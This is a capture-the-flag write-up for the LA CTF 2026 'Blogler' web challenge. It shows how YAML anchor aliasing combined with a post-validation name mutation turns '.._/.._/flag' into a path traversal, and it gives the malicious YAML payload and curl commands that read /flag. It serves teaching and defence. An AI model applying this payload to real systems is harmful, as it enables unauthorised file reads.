@@ -1,0 +1,133 @@
+---
+title: 'LA CTF 2026 - Blogler'
+description: 'Writeup for Blogler from LA CTF 2026. A Web challenge involving YAML anchor aliasing and post-validation mutation.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'yaml', 'logic-bug', 'path-traversal', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Flag:** `lactf{7m_g0nn4_bl0g_y0u}`
+
+## Overview
+
+Blogler is a Flask-based blogging platform where users can register, write blog posts in Markdown, and edit their blog serving configuration via a YAML editor. The flag is stored at `/flag` on the server.
+
+## Source Code Analysis
+
+The application stores per-user configuration as Python dicts:
+
+```python
+users[username] = {"user": {"name": "...", "password": "..."}, "blogs": [...]}
+```
+
+Users can update their config by uploading YAML, which is parsed with `yaml.safe_load` and validated by `validate_conf()`. The validation checks each blog entry's `name` field against path traversal:
+
+```python
+file_name = blog["name"]
+assert isinstance(file_name, str)
+file_path = (blog_path / file_name).resolve()
+if "../" in file_name or file_name.startswith("/") or not file_path.is_relative_to(blog_path):
+    return f"file path {file_name!r} is a hacking attempt..."
+```
+
+After validating blogs, the function updates the user's display name:
+
+```python
+conf["user"]["name"] = display_name(conf["user"].get("name", old_cfg["user"]["name"]))
+```
+
+Where `display_name` splits by `_`, capitalizes each part, and joins them:
+
+```python
+def display_name(username: str) -> str:
+    return "".join(p.capitalize() for p in username.split("_"))
+```
+
+When serving a blog, the app reads files using the stored `name` field without re-validating:
+
+```python
+blogs = [
+    {"title": blog["title"], "content": mistune.html((blog_path / blog["name"]).read_text())}
+    for blog in users[username]["blogs"]
+]
+```
+
+## Vulnerability
+
+The exploit chains two behaviors:
+
+### 1. YAML Anchor Aliasing Creates Shared Object References
+
+`yaml.safe_load` preserves Python object identity through YAML anchors (`&`) and aliases (`*`). By anchoring a blog entry dict and aliasing it as the `user` dict, both `conf["blogs"][0]` and `conf["user"]` become **the same Python dict object**.
+
+### 2. Post-Validation Mutation via `display_name`
+
+After all path traversal checks pass, `validate_conf` mutates `conf["user"]["name"]` by applying `display_name()`. Because `conf["user"]` and `conf["blogs"][0]` are the same dict, this mutation **also changes** `conf["blogs"][0]["name"]` — bypassing the already-completed validation.
+
+### The `display_name` Gadget
+
+The input `.._/.._/flag` is crafted so that:
+
+- **Before `display_name`** (during validation): `.._/.._/flag` passes all three checks:
+  - `"../" in ".._/.._/flag"` → `False` (the `_` breaks the `../` pattern)
+  - `".._/.._/flag".startswith("/")` → `False`
+  - `Path("/app/blogs/.._/.._/flag").is_relative_to("/app/blogs")` → `True` (`.._` is treated as a literal directory name)
+
+- **After `display_name`**: splitting by `_` gives `["..","/..","/flag"]`, capitalizing and joining produces `../../flag` — a valid path traversal that reads `/flag`.
+
+## Exploit
+
+### Step 1: Register an account
+
+```
+POST /register
+username=exploit789&password=exploit789
+```
+
+### Step 2: Upload malicious YAML config
+
+```
+POST /config
+config=
+blogs:
+  - &ref
+    title: "x"
+    name: ".._/.._/flag"
+user: *ref
+```
+
+The YAML anchor `&ref` makes the blog entry dict and the user dict the same object. Validation passes on `.._/.._/flag`, then `display_name` transforms it into `../../flag` in-place.
+
+### Step 3: View the blog
+
+```
+GET /blog/exploit789
+```
+
+The server reads `blog_path / "../../flag"` → `/app/blogs/../../flag` → `/flag`, and renders the flag as a blog post.
+
+## Reproduction
+
+```bash
+# Register
+curl -s -c cookies.txt -X POST 'https://blogler.chall.lac.tf/register' \
+  -d 'username=exploit789&password=exploit789'
+
+# Upload malicious config
+curl -s -c cookies.txt -b cookies.txt -X POST 'https://blogler.chall.lac.tf/config' \
+  --data-urlencode 'config=blogs:
+  - &ref
+    title: "x"
+    name: ".._/.._/flag"
+user: *ref'
+
+# Read the flag
+curl -s -b cookies.txt 'https://blogler.chall.lac.tf/blog/exploit789'
+```
+
+## Key Takeaways
+
+- `yaml.safe_load` is safe from **code execution**, but still preserves **object aliasing** which can lead to unexpected mutations.
+- Validating data and then mutating it in-place is dangerous when object references may be shared.
+- Path traversal checks should be applied at the point of use (file read), not just at the point of input.
